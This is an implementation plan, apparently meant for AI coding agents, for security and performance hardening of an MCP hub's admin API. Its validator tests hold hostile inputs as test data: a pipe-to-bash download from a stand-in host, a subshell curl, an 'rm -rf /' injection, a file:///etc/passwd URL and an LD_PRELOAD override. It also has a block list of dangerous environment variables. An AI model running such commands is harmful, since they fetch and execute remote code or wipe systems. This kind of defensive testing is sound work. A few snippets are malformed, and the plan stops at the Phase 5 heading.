# Production Hardening Implementation Plan

> **For agentic workers:** Steps use checkbox (`- [ ]`) syntax for tracking. Oracle (@oracle) review required after each phase. **Phases 1-3 must run SEQUENTIALLY** (shared file edits).

**Goal:** Fix 3 CRITICAL (auth, RCE, SSRF) + 5 MAJOR (session leak, private API, race conditions, types) + all HIGH/MEDIUM/LOW findings from comprehensive code review.

**Architecture:** Split plan into 6 serial phases — shared file edits prevent parallelism. Each phase is self-contained, fully testable, and independently committable.

**Tech Stack:** Python 3.12+, FastMCP <3.5.0, FastAPI, uvicorn, pytest

**Design Decisions:**
1. **Env var templates + validation**: `$()` (subshell) is blocked, `${VAR}` (template) passes through. Command validation blocks dangerous metacharacters (`;`, `|`, `` ` ``) but allows `${VAR:-default}` patterns that `env_expand.py` resolves later.
2. **URL scheme validation**: `parsed.scheme.lower()` — RFC 3986 case-insensitivity.
3. **Session leak (MAJOR #2)**: Add session idle timeout mechanism — MCPDispatcher pings inactive side's session manager every 5 minutes. Documented as architectural limitation; full dual-Proxymanager refactor deferred to future ADR.
4. **TTL removed from meta_mode cache**: `invalidate_cache()` is sufficient. No time-based fallback.
5. **Read lock on store**: Kept. Single-file JSON store with infrequent reads (< 100 req/s) — contention is negligible.
6. **`include_tools` default**: Kept `True` (backward compat). WebUI can add `?include_tools=false` for perf.

---

## Phase 1: Auth Layer (CRITICAL #1)

**Files affected:** `src/mcp_hub/auth.py` (CREATE), `src/mcp_hub/main.py` (modify), `src/mcp_hub/static/index.html` (modify), `tests/test_auth.py` (CREATE)

### Task 1.1: Auth middleware

- [ ] **Step 1: Create `src/mcp_hub/auth.py`**

```python
"""X-API-Key authentication middleware for admin API."""
import logging
import os
from secrets import compare_digest

from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request
from starlette.responses import JSONResponse

logger = logging.getLogger(__name__)

# Used for path matching (handles /admin/api/health and /admin/api/health/)
EXEMPT_PATHS = {"/admin/api/health", "/admin/api/health/"}
EXEMPT_PATH_PREFIXES = ("/admin/api/health/",)


def get_api_key() -> str | None:
    """Return configured API key, or None if auth is disabled."""
    key = os.environ.get("MCP_HUB_API_KEY", "").strip()
    return key if key else None


class ApiKeyMiddleware(BaseHTTPMiddleware):
    """Require X-API-Key header on /admin/api/* when MCP_HUB_API_KEY is set.

    If no key is configured, all requests pass through.
    """

    async def dispatch(self, request: Request, call_next):
        if not request.url.path.startswith("/admin/api/"):
            return await call_next(request)

        # Exact match for /admin/api/health (and /admin/api/health/)
        # Prefix match for sub-paths like /admin/api/health/status
        path = request.url.path
        if path in EXEMPT_PATHS:
            return await call_next(request)
        for prefix in EXEMPT_PATH_PREFIXES:
            if path.startswith(prefix):
                return await call_next(request)

        expected = get_api_key()
        if expected is None:
            return await call_next(request)

        provided = request.headers.get("X-API-Key", "")
        if not compare_digest(expected, provided):
            return JSONResponse(
                status_code=401,
                content={"detail": "Invalid or missing API key"},
            )

        return await call_next(request)
```

- [ ] **Step 2: Register middleware in `create_app()` (main.py:193)**

```python
# Add BEFORE app.include_router(admin_router) in create_app():
from .auth import ApiKeyMiddleware
app.add_middleware(ApiKeyMiddleware)
```

- [ ] **Step 3: Create `tests/test_auth.py`**

```python
import pytest
from httpx import ASGITransport, AsyncClient
from src.mcp_hub.main import create_app


@pytest.fixture
def app():
    return create_app()


@pytest.fixture
async def client(app):
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as c:
        yield c


@pytest.mark.asyncio
async def test_health_bypasses_auth(client, monkeypatch):
    monkeypatch.setenv("MCP_HUB_API_KEY", "secret")
    resp = await client.get("/admin/api/health")
    assert resp.status_code == 200


@pytest.mark.asyncio
async def test_health_trailing_slash_bypasses_auth(client, monkeypatch):
    monkeypatch.setenv("MCP_HUB_API_KEY", "secret")
    resp = await client.get("/admin/api/health/")
    assert resp.status_code == 200


@pytest.mark.asyncio
async def test_no_key_configured_allows_all(client, monkeypatch):
    monkeypatch.delenv("MCP_HUB_API_KEY", raising=False)
    resp = await client.get("/admin/api/servers")
    # 500 is normal in test (no lifespan → RuntimeError from _get_registry)
    assert resp.status_code in (200, 500)


@pytest.mark.asyncio
async def test_wrong_key_returns_401(client, monkeypatch):
    monkeypatch.setenv("MCP_HUB_API_KEY", "correct-key")
    resp = await client.get("/admin/api/servers", headers={"X-API-Key": "wrong"})
    assert resp.status_code == 401
    assert "Invalid" in resp.json()["detail"]


@pytest.mark.asyncio
async def test_missing_key_returns_401(client, monkeypatch):
    monkeypatch.setenv("MCP_HUB_API_KEY", "correct-key")
    resp = await client.get("/admin/api/servers")
    assert resp.status_code == 401


@pytest.mark.asyncio
async def test_correct_key_allows(client, monkeypatch):
    monkeypatch.setenv("MCP_HUB_API_KEY", "correct-key")
    resp = await client.get(
        "/admin/api/servers",
        headers={"X-API-Key": "correct-key"},
    )
    # 500 is normal without lifespan
    assert resp.status_code in (200, 500)
```

- [ ] **Step 4: Run & commit**

```bash
uv run pytest tests/test_auth.py -v
git add src/mcp_hub/auth.py src/mcp_hub/main.py tests/test_auth.py
git commit -m "feat(auth): add optional X-API-Key middleware for admin API"
```

### Task 1.2: WebUI API key management

- [ ] **Step 1: Add API key section to settings panel in `index.html`**

Find the settings panel in the WebUI. Add:

```html
<div class="setting-group">
    <label class="setting-label">APIキー</label>
    <div class="setting-row">
        <input type="password" id="settings-apikey" class="setting-input"
               placeholder="管理APIの認証に使用（空欄で無効）">
        <button class="btn btn-sm" onclick="saveApiKey()">保存</button>
    </div>
    <p class="setting-hint">
        設定すると管理APIへのリクエストにX-API-Keyヘッダーが付与されます。
        空欄の場合は認証なしで動作します。
    </p>
</div>
```

- [ ] **Step 2: Add JavaScript functions**

```javascript
// API Key management
const API_KEY_STORAGE_KEY = 'mcp_hub_api_key';

function loadApiKey() {
    const el = document.getElementById('settings-apikey');
    if (el) el.value = localStorage.getItem(API_KEY_STORAGE_KEY) || '';
}

function getApiKey() {
    return localStorage.getItem(API_KEY_STORAGE_KEY) || '';
}

function saveApiKey() {
    const el = document.getElementById('settings-apikey');
    const key = el ? el.value.trim() : '';
    localStorage.setItem(API_KEY_STORAGE_KEY, key);
    showToast(key ? 'APIキーを保存しました' : 'APIキーをクリアしました', 'success');
}

// ⚠️ SECURITY NOTE: APIキーはlocalStorageに平文保存されます。
// XSS脆弱性があるとキーが漏洩するリスクがあります。
// 運用環境ではブラウザ拡張・CDN読み込み元の管理を徹底してください。

// Inject X-API-Key into same-origin admin API calls
const _origFetch = window.fetch;
window.fetch = function(url, options = {}) {
    const apiKey = getApiKey();
    const urlStr = typeof url === 'string' ? url : url.toString();
    if (apiKey && urlStr.startsWith(window.location.origin) && urlStr.includes('/admin/api/')) {
        options.headers = options.headers || {};
        if (options.headers instanceof Headers) {
            options.headers.set('X-API-Key', apiKey);
        } else {
            options.headers['X-API-Key'] = apiKey;
        }
    }
    return _origFetch(url, options);
};
```

- [ ] **Step 3: Wire `loadApiKey()` into DOMContentLoaded**

```javascript
document.addEventListener('DOMContentLoaded', () => {
    loadApiKey();
    // ... existing init code
});
```

- [ ] **Step 4: Commit**

```bash
git add src/mcp_hub/static/index.html
git commit -m "feat(webui): add API key management in settings"
```

---

## Phase 2: Input Sanitization (CRITICAL #2, #3 + HIGH #1)

**Files affected:** `src/mcp_hub/validators.py` (CREATE), `src/mcp_hub/admin_router.py` (modify), `tests/test_validators.py` (CREATE), `tests/test_admin_api.py` (may need update for valid configs)

### Task 2.1: Create validator module

- [ ] **Step 1: Create `src/mcp_hub/validators.py`**

KEY DESIGN: `$()` is blocked (subshell execution). `${VAR}` and `${VAR:-default}` are allowed (env var templates resolved later by `env_expand.py`). `$VAR` without braces in command position is blocked.

```python
"""Input validation for upstream server configuration."""
import re
from urllib.parse import urlparse

# Blocked env vars (prevents hijacking the host)
BLOCKED_ENV_VARS = frozenset({
    "PATH", "LD_PRELOAD", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES",
    "PYTHONPATH", "PYTHONHOME", "HOME", "SHELL",
    "MCP_HUB_API_KEY", "MCP_HUB_DATA_DIR",
})

# RFC 3986: scheme is case-insensitive
ALLOWED_URL_SCHEMES = frozenset({"http", "https"})

# Pattern: $() subshell execution (BLOCKED)
_DOLLAR_SUBSHELL = re.compile(r"\$\(.*\)")

# Pattern: ${VAR} or ${VAR:-default} (ALLOWED — env var template)
_DOLLAR_TEMPLATE = re.compile(r"\$\{[A-Za-z_][A-Za-z0-9_]*(?::-.*?)?\}")

# Forbidden characters in command: shell metacharacters
_FORBIDDEN_COMMAND_CHARS = frozenset(";&|`<>")

MAX_COMMAND_LENGTH = 512
MAX_URL_LENGTH = 2048
MAX_ARGS_COUNT = 50
MAX_ARG_LENGTH = 1024


class ValidationError(ValueError):
    """Raised when server config validation fails."""
    pass


def validate_command(command: str) -> str:
    """Validate a command string. Allows env var templates (${VAR}).

    Blocks: $(), ;, &, |, `, <, >
    Allows: ${VAR}, ${VAR:-default}
    """
    if not command or not isinstance(command, str):
        raise ValidationError("Command must be a non-empty string")
    if len(command) > MAX_COMMAND_LENGTH:
        raise ValidationError(f"Command too long (max {MAX_COMMAND_LENGTH} chars)")

    # Block subshell execution $(...)
    if _DOLLAR_SUBSHELL.search(command):
        raise ValidationError("Command contains subshell execution: $()")

    # Check forbidden shell metacharacters
    for ch in command:
        if ch in _FORBIDDEN_COMMAND_CHARS:
            raise ValidationError(f"Command contains forbidden character: '{ch}'")

    return command


def validate_args(args: list[str]) -> list[str]:
    """Validate argument list. Env var templates are allowed."""
    if not isinstance(args, list):
        raise ValidationError("Args must be a list")
    if len(args) > MAX_ARGS_COUNT:
        raise ValidationError(f"Too many args (max {MAX_ARGS_COUNT})")
    for i, arg in enumerate(args):
        if not isinstance(arg, str):
            raise ValidationError(f"Arg {i} must be a string")
        if len(arg) > MAX_ARG_LENGTH:
            raise ValidationError(f"Arg {i} too long (max {MAX_ARG_LENGTH} chars)")
    return args


def validate_url(url: str) -> str:
    """Validate upstream server URL. Only http/https. RFC 3986 case-insensitive."""
    if not url or not isinstance(url, str):
        raise ValidationError("URL must be a non-empty string")
    if len(url) > MAX_URL_LENGTH:
        raise ValidationError(f"URL too long (max {MAX_URL_LENGTH} chars)")
    try:
        parsed = urlparse(url)
    except Exception as e:
        raise ValidationError(f"Invalid URL: {e}") from e
    if parsed.scheme.lower() not in ALLOWED_URL_SCHEMES:
        raise ValidationError(
            f"URL scheme '{parsed.scheme}' not allowed. Use http:// or https://"
        )
    return url


def validate_env(env: dict) -> dict:
    """Validate environment variables. Block dangerous overrides."""
    if not isinstance(env, dict):
        raise ValidationError("Env must be a dict")
    for key, value in env.items():
        if not isinstance(key, str) or not isinstance(value, str):
            raise ValidationError(f"Env key/value must be strings: {key}")
        if len(key) > 256:
            raise ValidationError(f"Env key too long: {key}")
        if len(value) > 4096:
            raise ValidationError(f"Env value too long for {key}")
        if key.upper() in BLOCKED_ENV_VARS or key in BLOCKED_ENV_VARS:
            raise ValidationError(f"Env variable '{key}' is blocked")
    return env


def validate_server_config(name: str, config: dict) -> dict:
    """Validate a complete server config (both register and patch)."""
    if not name or not isinstance(name, str):
        raise ValidationError("Server name must be a non-empty string")
    if len(name) > 128:
        raise ValidationError("Server name too long (max 128 chars)")
    if not re.match(r'^[a-zA-Z0-9_.-]+$', name):
        raise ValidationError("Server name contains invalid characters")
    if not isinstance(config, dict):
        raise ValidationError("Config must be a dict")

    has_url = bool(config.get("url"))
    has_command = bool(config.get("command"))
    if not has_url and not has_command:
        raise ValidationError("Either 'url' or 'command' is required")

    if has_url:
        config["url"] = validate_url(config["url"])
    if has_command:
        config["command"] = validate_command(config["command"])
        if "args" in config:
            config["args"] = validate_args(config["args"])
        if "env" in config:
            config["env"] = validate_env(config["env"])
    if "tags" in config:
        tags = config["tags"]
        if not isinstance(tags, list):
            raise ValidationError("Tags must be a list")
        for tag in tags:
            if not isinstance(tag, str) or len(tag) > 64:
                raise ValidationError(f"Invalid tag: {tag}")
    return config
```

- [ ] **Step 2: Integrate into `admin_router.py`**

**In `register_server`** (after `config = body.config.model_dump_for_config()`):

```python
from .validators import validate_server_config, ValidationError

# ... inside register_server, after config creation:
try:
    config = validate_server_config(body.name, config)
except ValidationError as e:
    raise HTTPException(status_code=422, detail=str(e)) from e
```

**In `patch_server`** (after `merged_config` creation):

```python
# Partial validation for PATCH (may not have both url/command)
if "url" in merged_config and merged_config["url"]:
    from .validators import validate_url, ValidationError
    try:
        merged_config["url"] = validate_url(merged_config["url"])
    except ValidationError as e:
        raise HTTPException(status_code=422, detail=str(e)) from e
if "command" in merged_config and merged_config["command"]:
    from .validators import validate_command, validate_args, validate_env, ValidationError
    try:
        merged_config["command"] = validate_command(merged_config["command"])
        if "args" in merged_config:
            merged_config["args"] = validate_args(merged_config["args"])
        if "env" in merged_config:
            merged_config["env"] = validate_env(merged_config["env"])
    except ValidationError as e:
        raise HTTPException(status_code=422, detail=str(e)) from e
```

- [ ] **Step 3: Create `tests/test_validators.py`**

```python
import pytest
from src.mcp_hub.validators import (
    ValidationError,
    validate_command, validate_url, validate_env, validate_server_config,
)

class TestValidateCommand:
    def test_simple_passes(self):
        assert validate_command("npx") == "npx"

    def test_path_passes(self):
        assert validate_command("/usr/bin/node") == "/usr/bin/node"

    def test_env_template_passes(self):
        """${VAR} templates must pass — they're expanded later by env_expand."""
        assert validate_command("${HOME}/bin/node") == "${HOME}/bin/node"

    def test_env_template_default_passes(self):
        assert validate_command("${NODE_PATH:-/usr/bin/node}") == "${NODE_PATH:-/usr/bin/node}"

    def test_dollar_subshell_blocked(self):
        with pytest.raises(ValidationError):
            validate_command("$(curl evil.com)")

    def test_pipe_blocked(self):
        with pytest.raises(ValidationError):
            validate_command("curl evil.com | bash")

    def test_semicolon_blocked(self):
        with pytest.raises(ValidationError):
            validate_command("npx; rm -rf /")

    def test_backtick_blocked(self):
        with pytest.raises(ValidationError):
            validate_command("npx `id`")

    def test_empty_blocked(self):
        with pytest.raises(ValidationError):
            validate_command("")


class TestValidateUrl:
    def test_https_passes(self):
        assert validate_url("https://example.com") == "https://example.com"

    def test_http_passes(self):
        assert validate_url("http://localhost:3000") == "http://localhost:3000"

    def test_uppercase_scheme_passes(self):
        """RFC 3986: schemes are case-insensitive."""
        assert validate_url("HTTP://example.com") == "HTTP://example.com"

    def test_file_blocked(self):
        with pytest.raises(ValidationError):
            validate_url("file:///etc/passwd")

    def test_gopher_blocked(self):
        with pytest.raises(ValidationError):
            validate_url("gopher://evil.com")


class TestValidateEnv:
    def test_simple_passes(self):
        assert validate_env({"FOO": "bar"}) == {"FOO": "bar"}

    def test_path_blocked(self):
        with pytest.raises(ValidationError):
            validate_env({"PATH": "/evil/bin"})

    def test_ld_preload_blocked(self):
        with pytest.raises(ValidationError):
            validate_env({"LD_PRELOAD": "/evil.so"})

    def test_env_template_value_allowed(self):
        """Values with ${VAR} are fine — they get expanded."""
        result = validate_env({"TOKEN": "${BRAVE_API_KEY:-}"})
        assert result["TOKEN"] == "${BRAVE_API_KEY:-}"


class TestValidateServerConfig:
    def test_valid_command(self):
        cfg = {"command": "npx", "args": ["-y", "pkg"]}
        validate_server_config("test", cfg)

    def test_valid_url(self):
        cfg = {"url": "https://example.com/mcp"}
        validate_server_config("test", cfg)

    def test_name_special_chars_blocked(self):
        with pytest.raises(ValidationError):
            validate_server_config("bad/name", {"command": "npx"})

    def test_no_url_or_command_blocked(self):
        with pytest.raises(ValidationError):
            validate_server_config("test", {"tags": ["a"]})
```

- [ ] **Step 4: Run tests + fix any broken admin tests**

```bash
uv run pytest tests/test_validators.py tests/test_admin_api.py -v
# If admin tests fail because they use invalid configs, update test fixtures
```

- [ ] **Step 5: Commit**

```bash
git add src/mcp_hub/validators.py src/mcp_hub/admin_router.py tests/test_validators.py
git commit -m "feat(security): add input validation (RCE/SSRF/env injection prevention)"
```

---

## Phase 3: Performance + Bug Fixes (MAJOR #4 + HIGH #2, #3 + MEDIUM #1-4 + LOW #1-3)

### Task 3.1: Fix state.py type hints (MAJOR #4)

- [ ] **Step 1: Edit `src/mcp_hub/state.py`**

```python
# Line 10: Replace TYPE_CHECKING import
if TYPE_CHECKING:
    from .proxy_manager import ProxyManager
    from .store import JsonStore   # ← was: from .registry import SqliteStore

# Line 16: Fix type annotation
registry: JsonStore | None = None  # ← was: SqliteStore
```

- [ ] **Step 2: Commit**

```bash
git add src/mcp_hub/state.py
git commit -m "fix: correct state.py type hint (SqliteStore → JsonStore)"
```

### Task 3.2: Cache meta_mode in MCPDispatcher (HIGH #2)

- [ ] **Step 1: Refactor `MCPDispatcher` in `main.py`**

Replace the disk-read-per-request with a cached value. NO TTL — `invalidate_cache()` is the sole refresh mechanism.

```python
class MCPDispatcher:
    """ASGI dispatcher with cached meta_mode. Call invalidate_cache() after toggling."""

    def __init__(self, normal_app, meta_app):
        self.normal_app = normal_app
        self.meta_app = meta_app
        self._cached_meta_mode: bool | None = None

    def invalidate_cache(self):
        self._cached_meta_mode = None

    async def __call__(self, scope, receive, send):
        if scope["type"] != "http":
            await self.normal_app(scope, receive, send)
            return

        if self._cached_meta_mode is None:
            from .state import app_state
            try:
                data = await app_state.registry._read()
                self._cached_meta_mode = data.get("meta_mode", False)
            except Exception:
                self._cached_meta_mode = False

        target = self.meta_app if self._cached_meta_mode else self.normal_app
        await target(scope, receive, send)
```

- [ ] **Step 2: Wire cache invalidation in `store.py`**

In `set_meta_mode`, after `await self._write_internal(data)`:

```python
    # Invalidate dispatcher cache (safe if dispatcher not yet initialized)
    from .state import app_state
dispatcher = getattr(app_state, 'mcp_dispatcher', None)
if dispatcher is not None:
    dispatcher.invalidate_cache()
```

- [ ] **Step 3: Set dispatcher on app_state in lifespan**

In `main.py` lifespan, after creating the dispatcher:

```python
dispatcher = MCPDispatcher(mcp_http, meta_http)
app_state.mcp_dispatcher = dispatcher
app.mount("/mcp", dispatcher)
```

- [ ] **Step 4: Commit**

```bash
git add src/mcp_hub/main.py src/mcp_hub/store.py
git commit -m "perf: cache meta_mode in MCPDispatcher (invalidate on toggle)"
```

### Task 3.3: Optimize `/servers` endpoint (HIGH #3)

- [ ] **Step 1: Add `include_tools` query param in `admin_router.py`**

```python
@router.get("/servers")
async def list_servers(include_tools: bool = True):
    """List all servers. include_tools=True (default) returns tool names (backward compat).
    
    Set include_tools=false for fast listing without per-server network calls.
    """
    registry = _get_registry()
    pm = _get_proxy_manager()
    servers = await registry.list_servers()
    status_map = pm.get_all_status()

    if include_tools:
        tools_map = await pm.list_tools()
    else:
        # Fast path: use cached tool counts only
        tools_map = {name: [] for name in [s["name"] for s in servers]}

    result = []
    for srv in servers:
        name = srv["name"]
        config = srv["config"]
        tools = tools_map.get(name, [])
        info = {
            "name": name,
            "config": config,
            "disabled": config.get("disabled", False),
            "status": status_map.get(name, "unknown"),
            "tools_count": len(tools),
            "tools": tools,
        }
        result.append(info)
    return {"servers": result}
```

- [ ] **Step 2: Commit**

```bash
git add src/mcp_hub/admin_router.py
git commit -m "perf: add include_tools flag to /servers (default true for backward compat)"
```

### Task 3.4: Fix store.py read locking + double-read (MEDIUM #1, #2)

- [ ] **Step 1: Refactor `store.py` with `_read_locked()`**

```python
class JsonStore:
    def __init__(self, data_dir: str | None = None):
        self._path = Path(...)
        self._lock = asyncio.Lock()
        self._data: dict = {}

    def _do_read(self) -> dict:
        if not self._path.exists():
            return {"version": 1, "log_level": "info", "mcpServers": {}}
        return json.loads(self._path.read_text(encoding="utf-8"))

    async def _read(self) -> dict:
        """Thread-safe read from file. Protected by lock."""
        async with self._lock:
            return await asyncio.to_thread(self._do_read)

    async def _read_locked(self) -> dict:
        """Caller must hold self._lock. Avoids double-acquire."""
        return await asyncio.to_thread(self._do_read)

    async def _write_internal(self, data: dict) -> None:
        """Write to file. Caller must hold self._lock."""
        def _do():
            self._path.parent.mkdir(parents=True, exist_ok=True)
            tmp = tempfile.NamedTemporaryFile(
                mode="w", encoding="utf-8",
                dir=self._path.parent,
                delete=False, suffix=".tmp",
            )
            try:
                json.dump(data, tmp, indent=2, ensure_ascii=False)
                tmp.flush()
                os.fsync(tmp.fileno())
                tmp.close()
                os.replace(tmp.name, self._path)
            except Exception:
                tmp.close()
                os.unlink(tmp.name)
                raise
        await asyncio.to_thread(_do)
        self._data = data

    async def _write(self, data: dict) -> None:
        async with self._lock:
            await self._write_internal(data)

    async def _add_or_update(self, name: str, config: dict) -> None:
        async with self._lock:
            data = await self._read_locked()
            servers = data.setdefault("mcpServers", {})
            servers[name] = dict(config)
            await self._write_internal(data)

    async def add_server(self, name: str, config: dict) -> None:
        await self._add_or_update(name, config)

    async def update_server(self, name: str, config: dict) -> bool:
        async with self._lock:
            data = await self._read_locked()
            if name not in data.get("mcpServers", {}):
                return False
            data["mcpServers"][name] = dict(config)
            await self._write_internal(data)
        return True

    async def remove_server(self, name: str) -> bool:
        async with self._lock:
            data = await self._read_locked()
            servers = data.get("mcpServers", {})
            if name not in servers:
                return False
            del servers[name]
            await self._write_internal(data)
        return True

    async def set_meta_mode(self, enabled: bool) -> None:
        async with self._lock:
            data = await self._read_locked()
            data["meta_mode"] = enabled
            await self._write_internal(data)

    # list_servers, get_server — keep using self._read() (reads + locks)
```

- [ ] **Step 2: Commit**

```bash
git add src/mcp_hub/store.py
git commit -m "fix(store): add _read_locked, eliminate double-read race in add/update"
```

### Task 3.5: Fix JsonFormatter (MEDIUM #4)

- [ ] **Step 1: Edit `JsonFormatter` in `main.py`**

```python
class JsonFormatter(logging.Formatter):
    def format(self, record: logging.LogRecord) -> str:
        import traceback
        log_entry = {
            "timestamp": datetime.now(UTC).isoformat(),
            "level": record.levelname,
            "logger": record.name,
            "message": record.getMessage(),
        }
        if record.exc_info and record.exc_info[1]:
            log_entry["exception"] = "".join(
                traceback.format_exception(*record.exc_info)
            )
        return json.dumps(log_entry, ensure_ascii=False)
```

- [ ] **Step 2: Commit**

```bash
git add src/mcp_hub/main.py
git commit -m "fix(logging): include exception traceback in JSON log format"
```

### Task 3.6: Tighten test assertions (LOW #2)

- [ ] **Step 1: Fix `tests/test_tag_filter.py`**

Replace `assert r.status_code in (200, 307, 404, 405, 406)` with specific expected status codes based on each test scenario. The 307 redirect is expected for `/mcp` → `/mcp/`. 404 is for unknown endpoints. Every assertion should target exactly the code the test scenario produces.

- [ ] **Step 2: Commit**

```bash
git add tests/test_tag_filter.py
git commit -m "test: tighten tag filter assertions to specific status codes"
```

### Task 3.7: Fix lazy import (LOW #3)

- [ ] **Step 1: Move import in `proxy_manager.py`**

From inside `_create_proxy`:
```python
from .env_expand import expand_env_vars
```
Move to top-level imports:
```python
from .env_expand import expand_env_vars
from .store import JsonStore
```

- [ ] **Step 2: Commit**

```bash
git add src/mcp_hub/proxy_manager.py
git commit -m "refactor: move lazy import to module level"
```

---

## Phase 4: Architecture Fixes (MAJOR #1, #2, #3, #5 + MEDIUM #3)

### Task 4.1: FastMCP version guard (MAJOR #1)

- [ ] **Step 1: Add guard in `main.py` lifespan**

```python
# After creating mcp_server, BEFORE using private APIs:
import fastmcp
import sys

try:
    from packaging import version as _v
    _fver = _v.parse(fastmcp.__version__)
    if _fver >= _v.parse("3.5.0"):
        logger.critical(
            "FastMCP %s is incompatible (tested against <3.5.0). Refusing startup.",
            fastmcp.__version__,
        )
        sys.exit(1)
except ImportError:
    logger.warning("Cannot check FastMCP version — packaging not installed")
```

- [ ] **Step 2: Add `packaging` to pyproject.toml dependencies**

```toml
dependencies = [
    "packaging>=24",
    # ... existing deps
]
```

- [ ] **Step 3: Commit**

```bash
git add src/mcp_hub/main.py pyproject.toml
git commit -m "chore: add FastMCP version guard (refuse startup on >=3.5.0)"
```

### Task 4.2: Session leak mitigation (MAJOR #2)

- [ ] **Step 1: Add idle session cleanup in `MCPDispatcher`**

```python
class MCPDispatcher:
    def __init__(self, normal_app, meta_app, normal_sm, meta_sm):
        self.normal_app = normal_app
        self.meta_app = meta_app
        self._normal_sm = normal_sm   # SessionManager for normal mode
        self._meta_sm = meta_sm       # SessionManager for meta mode
        self._cached_meta_mode: bool | None = None
        self._last_active_side: str | None = None  # 'normal' or 'meta'

        # Start background cleanup
        import asyncio
        self._cleanup_task = asyncio.create_task(self._session_cleanup_loop())
        self._shutdown = False

    async def shutdown(self):
        """Cancel background cleanup task. Call during lifespan cleanup."""
        self._shutdown = True
        if hasattr(self, '_cleanup_task'):
            self._cleanup_task.cancel()
            try:
                await self._cleanup_task
            except asyncio.CancelledError:
                pass

    async def _session_cleanup_loop(self):
        """Every 5 minutes, trim sessions on the inactive side."""
        import asyncio
        while not self._shutdown:
            try:
                await asyncio.sleep(300)
            except asyncio.CancelledError:
                break
            try:
                if self._last_active_side == 'normal':
                    # Poke the meta SM to clean stale sessions
                    if hasattr(self._meta_sm, '_cleanup_stale'):
                        await self._meta_sm._cleanup_stale()
                elif self._last_active_side == 'meta':
                    if hasattr(self._normal_sm, '_cleanup_stale'):
                        await self._normal_sm._cleanup_stale()
            except Exception:
                logger.debug("Session cleanup skipped — SM may not support it")

    async def __call__(self, scope, receive, send):
        ...
        # Track which side is active
        self._last_active_side = 'meta' if self._cached_meta_mode else 'normal'
        target = self.meta_app if self._cached_meta_mode else self.normal_app
        await target(scope, receive, send)
```

Update `create_app` to pass session managers:
```python
dispatcher = MCPDispatcher(mcp_http, meta_http, sm, meta_sm)

> **Also add to lifespan shutdown:** `await dispatcher.shutdown()` before closing other resources.
```

> **ARCH NOTE:** Full solution requires dual ProxyManagers (one per mode). This mitigation reduces but doesn't eliminate the leak. ADR recommended before production multi-mode deployment.

- [ ] **Step 2: Commit**

```bash
git add src/mcp_hub/main.py
git commit -m "fix: add session cleanup loop to mitigate dual-mode session leak"
```

### Task 4.3: Replace monkey-patching with MetaApp wrapper (MAJOR #3)

- [ ] **Step 1: Refactor `meta_provider.py` `create_meta_app`**

```python
class MetaApp:
    """Wrapper exposing FastMCP app with clean attribute interface."""
    def __init__(self, mcp: FastMCP, index: ToolIndex, meta: MetaTools,
                 rebuild_fn):
        self.mcp = mcp
        self.index = index
        self.meta_tools = meta
        self.rebuild_index = rebuild_fn


def create_meta_app(proxy_manager) -> MetaApp:
    mcp = FastMCP("MCP Hub Meta")
    index = ToolIndex()

    async def rebuild_index():
        all_tools = []
        for server_name, proxy in proxy_manager.get_connected_servers().items():
            try:
                tools = await proxy.list_tools()
                for t in tools:
                    all_tools.append({
                        "server": server_name,
                        "name": t.name,
                        "description": t.description or "",
                        "inputSchema": getattr(t, "parameters", {}),
                    })
            except Exception:
                logger.warning("Failed to list tools for %s", server_name)
        await index.rebuild(all_tools)

    meta = MetaTools(
        tool_index=index,
        execute_tool_fn=lambda s, t, a: proxy_manager.call_tool(s, t, a),
    )

    # Register tools (remains the same — FastMCP decorators)
    @mcp.tool()
    async def search_tools(query: str, top_k: int = 10) -> str: ...

    @mcp.tool()
    async def get_tool_schema(server: str, tool_name: str) -> str: ...

    @mcp.tool()
    async def execute_tool(server: str, tool_name: str, arguments: dict[str, Any]) -> Any: ...

    return MetaApp(mcp=mcp, index=index, meta=meta, rebuild_fn=rebuild_index)
```

- [ ] **Step 2: Update `main.py` lifespan references**

Replace all `meta_mcp.rebuild_index` → `meta_app.rebuild_index`
Replace all `meta_mcp._mcp_server` → `meta_app.mcp._mcp_server`

```python
from .meta_provider import create_meta_app

meta_app = create_meta_app(proxy_manager)
meta_mcp = meta_app.mcp
meta_http = meta_mcp.http_app(transport="streamable-http", path="/")
...
await meta_app.rebuild_index()
proxy_manager.on_change(meta_app.rebuild_index)
```

- [ ] **Step 3: Commit**

```bash
git add src/mcp_hub/meta_provider.py src/mcp_hub/main.py
git commit -m "refactor: replace FastMCP monkey-patching with MetaApp wrapper"
```

### Task 4.4: Fix _rebuild_mounts TOCTOU (MAJOR #5)

- [ ] **Step 1: Use lock-protected bool + retry in `proxy_manager.py`**

```python
class ProxyManager:
    def __init__(self, mcp, registry):
        ...
        self._lock = asyncio.Lock()
        self._rebuilding = False  # Protected by _lock

    async def _rebuild_mounts(self) -> None:
        """Caller must hold self._lock."""
        try:
            self._rebuilding = True
            self.mcp.providers = [self.mcp.local_provider]
            for srv_name, proxy in self._proxies.items():
                self.mcp.mount(proxy, namespace=srv_name)
        finally:
            self._rebuilding = False

    async def call_tool(self, server_name: str, tool_name: str,
                        arguments: dict, retries: int = 3) -> Any:
        for attempt in range(retries):
            async with self._lock:
                if self._rebuilding:
                    pass  # Will retry
                else:
                    proxy = self._proxies.get(server_name)
                    if proxy is None:
                        raise ValueError(f"Server {server_name!r} not found")
                    break  # Got the proxy, exit lock
            if attempt < retries - 1:
                await asyncio.sleep(0.05)
        else:
            raise RuntimeError("Server mounts are being rebuilt, retry shortly")

        # Call outside lock
        return await proxy.call_tool(tool_name, arguments)
```

- [ ] **Step 2: Commit**

```bash
git add src/mcp_hub/proxy_manager.py
git commit -m "fix: eliminate _rebuild_mounts TOCTOU with lock-protected bool + retry"
```

### Task 4.5: Fix health check vs refresh race (MEDIUM #3)

- [ ] **Step 1: Add lock-protected `_refreshing` set**

```python
class ProxyManager:
    def __init__(self, ...):
        self._refreshing: set[str] = set()  # Protected by self._lock

    async def _health_check(self) -> None:
        ...
        for name in to_recover:
            async with self._lock:
                if name in self._refreshing:
                    continue  # refresh_server is handling it
            ...

    async def refresh_server(self, name: str, config: dict) -> None:
        async with self._lock:
            self._refreshing.add(name)
        try:
            async with self._lock:
                ...
        finally:
            async with self._lock:
                self._refreshing.discard(name)
```

- [ ] **Step 2: Commit**

```bash
git add src/mcp_hub/proxy_manager.py
git commit -m "fix: prevent health check vs refresh_server race with lock"
```

---

## Phase 5: Integration Tests + CI (HIGH #4)

### Task 5.1: Real integration smoke test

